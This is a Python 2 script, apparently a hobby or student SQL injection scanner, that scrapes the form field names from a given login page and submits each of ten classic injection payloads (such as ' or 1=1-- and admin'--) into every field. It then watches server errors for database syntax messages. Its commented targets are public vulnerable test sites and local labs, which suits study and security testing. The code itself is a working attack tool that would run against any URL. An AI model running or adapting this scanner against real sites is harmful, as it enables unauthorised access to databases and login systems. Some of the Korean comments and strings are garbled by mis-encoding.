# -*- coding: utf-8 -*-
'''
Created on 2016. 7. 20.
@author: jhj
'''
import sys
import urllib, urllib2, cookielib
from py4j.java_gateway import JavaGateway, GatewayParameters
import mechanize


def url(url):
    # url = raw_input("url�� �Է��ϼ���: ")
    # real_url ="http://s50247-102131-hm3.tarentum.hack.me/index.php"
    # real_url = "http://192.168.0.32:5555/WebGoat/start.mvc"
    # url = "http://demo.testfire.net/bank/login.aspx"
    # real_url="http://127.0.0.1:8088/mySecondPro/login.do"
    # real_url ="http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F"
    # real_url = "http://demo.testfire.net/bank/transaction.aspx"
    # real_url="http://www.daum.net/"
    print "�Էµ� url", url
    scan_header(url)
    # scan_header(real_url)
               
def scan_header(url):
    print url, " \nopen..."
    opener = urllib.urlopen(url)
    print "url ��ȿ�� �˻� ��..."
    if opener.code == 200:
        print "url status: 200 ok"
        print "header infor....\n",opener.headers 
        test2 = form_mechanize(url)
        print test2
        req_url(url, test2)
            
    elif opener.code == 404:
        
        print "page was not found check it"
        exit()

def form_mechanize(real_url):
   
    cj = mechanize.CookieJar()
    br = mechanize.Browser()  # create Browser
    br.set_cookiejar(cj)
    br.set_handle_robots(False)
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    print "br.open...."   
    br.open(real_url)
    
    formname = []
    userTagId = []
    formSubmit = []
    for form in br.forms():
        # print form
        # print "form name list up"
        formname.append(form.name)  
    
    print "-------------[*] formname list up-----------"     
    print formname
    
    for names in formname :
        if names != "None":
            test = names
    formSubmit.append(test)
    br.select_form(name=test) 
    for control in br.form.controls:
        # print control.type,control.name,br[control.name]
        if control.name != "None":    
            if control.type != "submit" :
                userTagId.append(control.name)
            else:
                formSubmit.append(control.name)
                     
    print "-------------[*] form input id list up-----------"
    print userTagId   
       
    return userTagId 

def req_url(real_url, test2):
    sqli_pattern = {'pattern1':"'or'1'='1", 'pattern2':"'or'1'='2", 'pattern3':"' or 1=1-- ",
                  'pattern4':"' or 1=1#", 'pattern5':"admin' #",
                  'pattern6':"'union select 1  limit 1, 1%23",
                  'pattern7':"'", 'pattern8':"a' or 1=1 --", 'pattern9':"')or(x'='x",
                  'pattern10':"admin'--"}
    

    plist = []
    payload = {}
    res = []
    
    for p in sqli_pattern.keys():  # sql 패턴의 키 값을 추출 
        plist.append(p)  # 추출한 키 값을 순서대로 삽입
        # print "plist"
        # print plist #추출한 키값을 리스트로 저장 
    for pattern in plist:
        payload = {}
        
        for tagId in test2:
            # payload={tagId:sqli_pattern.get(pattern)}
            print tagId, sqli_pattern.get(pattern)
            # if tagId!=payload[tagId]:
            payload[tagId] = sqli_pattern.get(pattern)
        res.append(payload)
    print res    
     
    sqli_attack(real_url, res)

def sqli_attack(real_url, result):
    
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    
    for re in result:
        print re
        data = urllib.urlencode(re)
           
        try:
            request = urllib2.Request(real_url, data)
            res = opener.open(request)
            print "****************************"
           
            print re, "-----------------------"
            print res.read()
            print "----------------------"
            res.close()
        except urllib2.HTTPError, error:
            # content = error.read()
            if error.getcode() == 500:
                # print "*****----------------*************"
                # print "fasdfadf\n",error.getcode
                dberror = error.read()
                errorCheck(re, dberror)
                   
                   
            # print "fasdfasdf\n",content
            
    
    
    # req = urllib2.Request(real_url,data)
def errorCheck(re, dberror):
    
    print "DBERORR\n", re, dberror
    if "Syntax error (missing operator) in query expression" in dberror:
        print "sql Injection", "1"

    
if __name__ == "__main__":
    gateway = JavaGateway()

    print "python dfsaf 코드 실행중......"
    print "python py4j gateway start......"
    java_url = gateway.entry_point.getStack() # 브라우져
    print "python py4j getUrl 호출......"

    #java_url.push("jonghyuck ggamae")
    #internal_list = java_url.getInternalList()
    #print str(internal_list)
    #print java_url.pop()
    url(java_url.getUrl())
    #url("http://demo.testfire.net/bank/login.aspx")

    java_url.push("jonghyuck ggamae")
    internal_list = java_url.getInternalList()
    print str(internal_list)
    print java_url.pop()
    print "hyejt jol mot"
    url("http://demo.testfire.net/bank/login.aspx")
#f=open("C:/Users/Administrator/Documents/data.txt","w")
    #f.write(str(java_url))
    #f.close()
    #print java_url,str(java_url)

    #print "python py4j gateway 호출완료......"
    #print "url method 호출 중...."

    #url(java_url)

    #url(java_url)
    
    
    
